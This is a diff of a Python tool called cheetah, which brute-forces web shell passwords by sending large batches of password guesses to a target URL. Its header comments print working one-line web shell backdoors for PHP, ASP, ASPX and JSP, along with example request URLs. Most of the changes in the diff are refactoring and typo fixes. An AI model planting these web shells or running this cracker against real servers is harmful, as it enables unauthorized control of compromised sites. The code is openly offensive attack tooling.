@@ -16,7 +16,7 @@ password violent crack tools.
 # php:  =>  <?php @eval($_GET['sunnyelf']);?> or <?php @eval($_POST['sunnyelf']);?>
 # http://localhost/shell_get.php?pwd=$s=pwd;print($s);&sunnyelf=$s=sunnyelf;print($s);
 # asp:  =>  <%eval request("sunnyelf")%>
-# http://localhost/shell.asp?pwd=response.write("pwd")&sunyelf=response.write("sunnyelf")
+# http://localhost/shell.asp?pwd=response.write("pwd")&sunnyelf=response.write("sunnyelf")
 # aspx:  =>  <%@ Page Language="Jscript"%><%eval(Request.Item["sunnyelf"]);%>
 # http://localhost/shell.aspx?pwd=Response.Write("pwd");&sunnyelf=Response.Write("sunnyelf")
 # jsp:  =>  <%Runtime.getRuntime().exec(request.getParameter("sunnyelf"));%>
@@ -44,6 +44,17 @@ yellow = '\033[1;33m'
 white = '\033[1;37m'
 reset = '\033[0m'
 
+
+def print_highlight(message):
+    times = get_time()
+    msg_level = {'INFO': green, 'HINT': white, 'WARN': yellow, 'ERROR': red}
+    for level, color in msg_level.items():
+        if level in message:
+            print(color+times+message+reset)
+            return
+    print(white+times+message+reset)
+    return
+
 try:
     with open('data/user-agent.list') as agent_file:
         agent_list = agent_file.readlines()
@@ -57,22 +68,10 @@ def get_time():
     return '[' + time.strftime("%H:%M:%S", time.localtime()) + '] '
 
 
-def print_highlight(message):
-    times = get_time()
-    msg_level = {'INFO':green, 'HINT':white,
-                  'WARN':yellow, 'ERROR':red}
-    for level, color in msg_level.items():
-        if level in message:
-            print(color+times+message+reset)
-            return
-    print(white+time+message+reset)
-    return
-
-
-def quit(signum, frame):
+def exit_cheetah(signum, frame):
     print_highlight('[HINT] you pressed the Ctrl + C key to terminate cheetah')
     print_highlight('[INFO] the cheetah end execution')
-    exit(0)
+    exit(signum)
 
 
 def print_info():
@@ -144,7 +143,7 @@ def req_get(payload, times, options):
         print_highlight('[HINT] sleeping '+str(options.time)+' seconds to request')
         time.sleep(options.time)
     if options.verbose:
-        print_highlight('[INFO] geting '+str(times)+'th group payload to '+options.url)
+        print_highlight('[INFO] getting '+str(times)+'th group payload to '+options.url)
         print_highlight('[HINT] waiting for web server response')
 
     try:
@@ -153,7 +152,7 @@ def req_get(payload, times, options):
                          params=payload,
                          timeout=10)
     except Exception as e:
-        print_highlight(error_msg)
+        print_highlight(e.message)
         return 'error'
 
     error_msg = '[ERROR] '+options.url+' response code: '+str(r.status_code)
@@ -297,7 +296,7 @@ def detect_web(options):
         if put_rsp.status_code == 405 or put_rsp.status_code == 411:
             options.server = 'nginx'
             print_highlight(web_hint+options.server)
-        if put.status_code == 200:
+        if put_rsp.status_code == 200:
             options.server = 'apache'
             print_highlight(web_hint+options.server)
 
@@ -319,7 +318,8 @@ def set_max_req(options):
                        'iis': {'post': 4000, 'get': 45}}
         for server in server_dict:
             if server in options.server:
-                print_highlight('[INFO] setting the number of request parameters '+str(server_dict[server][options.req_type]))
+                print_highlight('[INFO] setting the number of request parameters '
+                                +str(server_dict[server][options.req_type]))
                 options.max_request = server_dict[server][options.req_type]
                 break
 
@@ -418,7 +418,7 @@ def dict_attack(options):
     print_highlight('[WARN] the cheetah did not find the webshell password')
     print_highlight('[HINT] try to change a better password dictionary file')
     print_highlight('[HINT] try to specify a smaller value of parameter -n')
-    print_highlight('[HINT] try to use parameter -e enable random hearder')
+    print_highlight('[HINT] try to use parameter -e enable random header')
     if options.req_type == 'post':
         print_highlight('[HINT] try to specify parameter -r for GET request')
     if options.req_type == 'get':
@@ -433,14 +433,14 @@ def main():
         exit(1)
 
     parser = argparse.ArgumentParser(
-       formatter_class=argparse.RawTextHelpFormatter,
-       epilog='''\
-use examples:
-  python cheetah.py -u http://orz/orz.php
-  python cheetah.py -u http://orz/orz.jsp -r post -n 1000 -v
-  python cheetah.py -u http://orz/orz.asp -r get -c -p data/pwd.list
-  python cheetah.py -u http://orz/orz -w aspx -s iis -n 1000
-  python cheetah.py -b url.list -c -p pwd1.list pwd2.list -v''')
+        formatter_class=argparse.RawTextHelpFormatter,
+        epilog='''\
+        use examples:
+          python cheetah.py -u http://orz/orz.php
+          python cheetah.py -u http://orz/orz.jsp -r post -n 1000 -v
+          python cheetah.py -u http://orz/orz.asp -r get -c -p data/pwd.list
+          python cheetah.py -u http://orz/orz -w aspx -s iis -n 1000
+          python cheetah.py -b url.list -c -p pwd1.list pwd2.list -v''')
     parser.add_argument('-i', '--info', action='store_true', dest='info',
                         help='show information of cheetah and exit')
     parser.add_argument('-v', '--verbose', action='store_true', dest='verbose',
@@ -477,10 +477,10 @@ use examples:
 
     if options.update:
         abs_dir = os.path.dirname(os.path.abspath(__file__))
-        if os.path.exists(os.path.join(abs_dir, '.git')) is True:
+        if os.path.exists(os.path.join(abs_dir, '.git')):
             print('[*] hint: use "git pull origin master" update cheetah')
             exit(0)
-        if os.path.isfile(os.path.join(abs_dir, 'update.py')) is False:
+        if not os.path.isfile(os.path.join(abs_dir, 'update.py')):
             print('[!] error: can not find file update.py')
             print('[*] hint: use "git clone '+__github__+'.git" to update')
             print('[*] hint: open link '+__github__+' with browser to download')
@@ -504,7 +504,7 @@ use examples:
     options.server = options.server.lower()
 
     print_highlight('[INFO] the cheetah start execution')
-    signal.signal(signal.SIGINT, quit)
+    signal.signal(signal.SIGINT, exit_cheetah)
     if options.verbose:
         print_highlight('[INFO] using verbose mode')
     if options.remove:
@@ -526,20 +526,15 @@ use examples:
     if options.url_file is not None:
         print_highlight('[HINT] using batch cracking mode')
         print_highlight('[INFO] opening urls file '+options.url_file)
-        try:
-            url_file = open(options.url_file)
-        except Exception as e:
-            print_highlight('[ERROR] '+str(e))
-            print_highlight('[INFO] the cheetah end execution')
-            exit(1)
-        print_highlight('[INFO] using urls file '+options.url_file)
-        print_highlight('[HINT] using dictionary-based password attack')
-        for url_line in url_file:
-            options.url = url_line.replace('\n', '')
-            attack_res = dict_attack(options)
-            if attack_res == 'find' or attack_res == 'error':
-                continue
-        url_file.close()
+        with open(options.url_file) as url_file:
+            print_highlight('[INFO] using urls file '+options.url_file)
+            print_highlight('[HINT] using dictionary-based password attack')
+            for url_line in url_file:
+                options.url = url_line.replace('\n', '')
+                attack_res = dict_attack(options)
+                if attack_res == 'find' or attack_res == 'error':
+                    continue
+
     print_highlight('[INFO] the cheetah end execution')
 
 
